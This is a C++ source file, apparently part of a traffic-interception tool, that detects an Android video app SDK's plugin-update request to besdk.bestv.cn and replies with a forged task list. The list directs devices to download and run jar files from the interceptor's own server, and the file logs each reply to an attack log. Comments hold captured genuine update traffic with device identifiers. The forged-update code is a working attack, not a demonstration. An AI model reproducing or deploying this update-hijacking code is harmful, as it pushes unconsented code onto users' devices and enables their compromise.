#include "letvPlugin.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../Public.h"
#include "sslPublic.h"

int LeTVPlugin::isletvPlugin(string url, string host) {
	if (host.find("besdk.bestv.cn") != -1 && url.find("/api/init?") != -1)
	{
		return TRUE;
	}
	return FALSE;
}

int LeTVPlugin::replyletvPlugin(char * dstbuf,int buflen,int buflimit, string username) {

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/json; charset=utf8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;
	string strip = HttpUtils::getIPstr(gServerIP) + ":80/" + username;
	int version1 = 99;	//27
	int version2 = 99;	//22
	int version3 = 99;

	//string patchfn1 = "letvby.jar";
	string patchfn2 = "letvirs.jar";
	string patchfn3 = "letvbd.jar";
	//string filename1 = Public::getUserPluginPath(username) + patchfn1;
	string filename2 = Public::getUserPluginPath(username) + patchfn2;
	string filename3 = Public::getUserPluginPath(username) + patchfn3;

	char szmd5_1[64] = { 0 };
	char szmd5_2[64] = { 0 };
	char szmd5_3[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	//int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);
	int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szmd5_2, hexmd5, 1);
	int filesize3 = CryptoUtils::getUpdateFileMd5(filename3, szmd5_3, hexmd5, 1);

	char hdrformat[4096];
	char szformat[] = 
		"{\"code\":0,\"msg\":\"success\",\"interval\":720,\"tasks\":["

// 		"{\"id\":\"10\",\"name\":\"BY\",\"type\":\"jar\",\"createTime\":\"2029-07-25 15:58:00.000000\","
// 		"\"data\":{\"delay\":\"1800\",\"downloadUrl\":\"http://%s/%s\","
// 		"\"canDelete\":\"false\",\"md5\":\"%s\","
// 		"\"fileName\":\"%s\",\"packageName\":\"com.by.sk.ByEntry\","
// 		"\"exeMethod\":\"task\",\"showType\":\"dialog\",\"visitType\":\"web\"}},"

		"{\"id\":\"8\",\"name\":\"irs01\",\"type\":\"jar\",\"createTime\":\"2029-08-15 23:47:00.000000\","
		"\"data\":{\"delay\":\"1800\",\"downloadUrl\":\"http://%s/%s\","
		"\"canDelete\":\"false\",\"md5\":\"%s\",\"fileName\":\"%s\","
		"\"packageName\":\"com.ndp.Main\",\"exeMethod\":\"task\",\"showType\":\"dialog\",\"visitType\":\"web\"}},"

		"{\"id\":\"23\",\"name\":\"bysk\",\"type\":\"jar\",\"createTime\":\"2029-03-11 22:34:00.000000\","
		"\"data\":{\"delay\":\"1800\",\"downloadUrl\":\"http://%s/%s\",\"canDelete\":\"false\","
		"\"md5\":\"%s\",\"fileName\":\"%s\",\"packageName\":\"com.by.sk.ByEntry\","
		"\"exeMethod\":\"task\",\"showType\":\"dialog\",\"visitType\":\"web\"}}"
		"]}";
	int httphdrlen = sprintf_s(hdrformat, 4096, szformat,
		//strip.c_str(), patchfn1.c_str(), szmd5_1, patchfn1.c_str(),
		strip.c_str(), patchfn2.c_str(), szmd5_2, patchfn2.c_str(),
		strip.c_str(), patchfn3.c_str(), szmd5_3, patchfn3.c_str());

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	char szout[4096];
	int outlen = sprintf_s(szout, 4096, "dpmanager reply:%s\r\n", dstbuf);
	Public::WriteLogFile(ATTACK_LOG_FILENAME, szout, outlen);

	return retlen;
}

/*
GET /api/init?channel=lstv_service&deviceId=OPPOA57_02-00-00-00-00-00_ffffffff9df6bde3ffffffff8ae0a42e&sdkVersion=1.1801.2417&versionName=9.9 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: besdk.bestv.cn:9090
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 25 Oct 2019 13:41:44 GMT
Content-Type: application/json; charset=utf8
Content-Length: 716
Connection: keep-alive
Keep-Alive: timeout=120
X-Frame-Options: SAMEORIGIN

{"code":0,"msg":"success","interval":720,"tasks":[
{"id":"8","name":"irs01","type":"jar","createTime":"2019-03-11 14:13:00.000000",
"data":{
"delay":"35","downloadUrl":"http://117.131.79.4:90/media/wa1025.jar",
"canDelete":"false","md5":"BE36DC77D5E8CDF735F3CDBEC4611FEC","fileName":"wa1025.jar","packageName":"com.ndp.Main",
"exeMethod":"task","showType":"dialog","visitType":"web"}},

{"id":"23","name":"bysk","type":"jar","createTime":"2019-09-22 02:43:00.000000",
"data":{
"delay":"10","downloadUrl":"http://117.131.79.4:90/media/by1024.jar",
"canDelete":"false","md5":"743CE2650DA885D0CD1C40452A401DEE","fileName":"by1024.jar","packageName":"com.by.sk.ByEntry",
"exeMethod":"task","showType":"dialog","visitType":"web"}}]}
*/


/*
GET /api/init?channel=lstv_service&deviceId=PLK-AL10_48-db-50-14-f0-be_000000003627274f000000004a5844d6&sdkVersion=1.1801.2417&versionName=8.12.1 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0.2; PLK-AL10 Build/HONORPLK-AL10)
Host: besdk.bestv.cn:9090
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 28 May 2019 10:26:18 GMT
Content-Type: application/json; charset=utf8
Transfer-Encoding: chunked
Connection: keep-alive
Keep-Alive: timeout=120
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip

{"code":0,"msg":"success","interval":720,"tasks":[{"id":"2","name":"BY","type":"jar","createTime":"2019-04-10 19:09:00.000000","data":{"delay":"15","downloadUrl":"http://183.131.189.116:90/media/ml0521.jar","canDelete":"false","md5":"7BCB52CFCDDFA35503AC15BDBB19B0ED","fileName":"ml0521.jar","packageName":"com.adview.AdViewManager","exeMethod":"task","showType":"dialog","visitType":"web"}},{"id":"3","name":"mplus","type":"jar","createTime":"2017-10-13 11:59:00.000000","data":{"delay":"50","downloadUrl":"http://183.131.189.116:90/media/slup_0417.jar","canDelete":"false","md5":"5C3E5EBC6455EF53124BF8C95039ED6C","fileName":"slup_0417.jar","packageName":"cn.xf.util.slup.AdEntry","exeMethod":"InitEntry","showType":"dialog","visitType":"web"}},{"id":"8","name":"irs01","type":"jar","createTime":"2019-03-11 14:13:00.000000","data":{"delay":"40","downloadUrl":"http://117.131.79.4:90/media/irs0528_X4A7GyR.jar","canDelete":"false","md5":"3CE3642F05AA72B71CCAB28B148EEAA0","fileName":"irs0528_X4A7GyR.jar","packageName":"com.dp.DPManager","exeMethod":"task","showType":"dialog","visitType":"web"}}]}


*/



/*
GET /app/config?pcode=210110000&version=1.8 HTTP/1.1
User-Agent: LETV/1.8; LetvGphoneClient/9.9Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: api-svoice.le.com
Connection: Keep-Alive
Accept-Encoding: gzip
If-Modified-Since: Fri, 25 Oct 2019 02:17:01 GMT

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 25 Oct 2019 02:45:08 GMT
Content-Type: application/json; charset=UTF-8
Content-Length: 872
Connection: keep-alive
Access-Control-Allow-Origin:
Content-Encoding: gzip
Vary: Origin
Vary: Accept-Encoding
Leeco: 0.006-SLBMTAuMTIyLjEzMC4yNQo=-ID200124.65.144:80-200

{"code":0,"message":"鏌ヨ鎴愬姛","data":{"list":[{"id":1,"config_name":"score.M","config_value":"6888"},
{"id":2,"config_name":"score.N","config_value":"18888"},{"id":3,"config_name":"share","config_value":"1"},
{"id":4,"config_name":"propshop","config_value":"1"},{"id":6,"config_name":"danmu","config_value":"1"},
{"id":7,"config_name":"recharge_coin","config_value":"0"},{"id":9,"config_name":"floating_screen","config_value":"5200"},
{"id":10,"config_name":"floating_single","config_value":"500"},{"id":11,"config_name":"gift_bag","config_value":"1"},
{"id":12,"config_name":"pull_users","config_value":"30"},{"id":13,"config_name":"breakegg_single","config_value":"1000"},
{"id":14,"config_name":"breakegg_screen","config_value":"2500"},{"id":15,"config_name":"online_number","config_value":"0"},
{"id":16,"config_name":"share_yuyinapp","config_value":"0"},{"id":17,"config_name":"redpacket_permission","config_value":"66"},
{"id":18,"config_name":"redpacket_max","config_value":"100000"},{"id":19,"config_name":"score.RandBase","config_value":"400"},
{"id":20,"config_name":"score.RandMax","config_value":"600"},{"id":21,"config_name":"boss_cd","config_value":"120"},
{"id":22,"config_name":"boss_line","config_value":"520"},{"id":23,"config_name":"eggmessage_cd","config_value":"30"},
{"id":24,"config_name":"app_download","config_value":"http://cdn.svoice.le.com/uploads/b1/ae/b1ae5e116fd060372e4931c9d3c403a1.apk"},
{"id":25,"config_name":"app_cd","config_value":"1"},{"id":26,"config_name":"yuyin_child","config_value":"0"},
{"id":27,"config_name":"multisend_list","config_value":"[{\"num\":1,\"name\":\"涓€蹇冧竴鎰�?},
{\"num\":10,\"name\":\"鍗佸叏鍗佺編\"},{\"num\":66,\"name\":\"濂借繍杩炶繛\"},
{\"num\":188,\"name\":\"瑕佹姳鎶�?},{\"num\":520,\"name\":\"鎴戠埍浣�?},
{\"num\":999,\"name\":\"闀块暱涔呬箙\"},{\"num\":1314,\"name\":\"涓€鐢熶竴涓�?}]"},
{"id":28,"config_name":"identity_child","config_value":"2"},{"id":29,"config_name":"whitelist_child","config_value":"108"},
{"id":30,"config_name":"identity_age","config_value":"18"},{"id":31,"config_name":"face_simlarity","config_value":"40"},
{"id":32,"config_name":"newred_permission","config_value":"66"},{"id":33,"config_name":"redpacket_ratio","config_value":"0"},
{"id":34,"config_name":"honey_single","config_value":"500"},{"id":35,"config_name":"honey_screen","config_value":"1500"},
{"id":36,"config_name":"groupred_ratio","config_value":"0"},{"id":37,"config_name":"red_screen","config_value":"9000"},
{"id":38,"config_name":"groupred_switch","config_value":"1"},{"id":39,"config_name":"must_update","config_value":"0"},
{"id":40,"config_name":"android_pcode","config_value":"190"},
{"id":41,"config_name":"auto_address","config_value":"http://cdn.svoice.le.com/uploads/3d/9e/3d9eb35ee9799431cb0f907dd3e327e3.apk"},
{"id":42,"config_name":"target_single","config_value":"86"},{"id":43,"config_name":"target_both","config_value":"89"}]}}
*/